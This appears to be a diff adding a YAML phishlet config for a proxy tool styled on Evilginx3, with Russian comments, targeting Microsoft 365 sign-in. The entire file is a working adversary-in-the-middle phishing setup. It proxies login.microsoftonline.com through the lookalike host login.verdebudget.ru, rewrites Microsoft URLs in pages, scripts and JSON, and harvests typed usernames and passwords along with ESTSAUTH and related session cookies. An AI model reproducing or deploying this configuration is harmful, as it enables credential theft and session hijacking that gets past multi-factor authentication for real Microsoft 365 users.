@@ -1,0 +1,81 @@
+# Microsoft 365 Phishlet для verdebudget.ru
+# Полная копия архитектуры Evilginx3
+# PhantomProxy v1.0.0
+
+author: '@phantom-proxy'
+min_ver: '1.0.0'
+
+# Хосты для проксирования
+proxy_hosts:
+  - phish_sub: 'login'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    session: true
+    is_landing: true
+    auto_filter: true
+    
+  - phish_sub: 'api'
+    orig_sub: 'api'
+    domain: 'microsoft.com'
+    session: false
+    is_landing: false
+    auto_filter: true
+
+# Правила замены контента - ГЛАВНЫЙ МЕХАНИЗМ
+sub_filters:
+  # Замена URL в HTML
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'https://login.microsoftonline.com'
+    replace: 'https://login.verdebudget.ru:8443'
+    mimes: ['text/html', 'application/json', 'application/javascript']
+    
+  # Замена URL в JavaScript
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'login.microsoftonline.com'
+    replace: 'login.verdebudget.ru:8443'
+    mimes: ['application/javascript', 'text/javascript']
+    
+  # Замена URL в JSON ответах
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: '"url":"https://login.microsoftonline.com'
+    replace: '"url":"https://login.verdebudget.ru:8443'
+    mimes: ['application/json']
+
+# Токены аутентификации для перехвата
+auth_tokens:
+  - domain: '.microsoftonline.com'
+    keys:
+      - 'ESTSAUTH'
+      - 'ESTSAUTHPERSISTENT'
+      - 'SignInCookies'
+      
+  - domain: '.microsoft.com'
+    keys:
+      - 'MSOAuth'
+
+# Конфигурация перехвата креденшалов
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+# URLs успешной аутентификации
+auth_urls:
+  - '/common/oauth2/v2.0/authorize'
+  - '/kmsi'
+
+# Страница входа
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
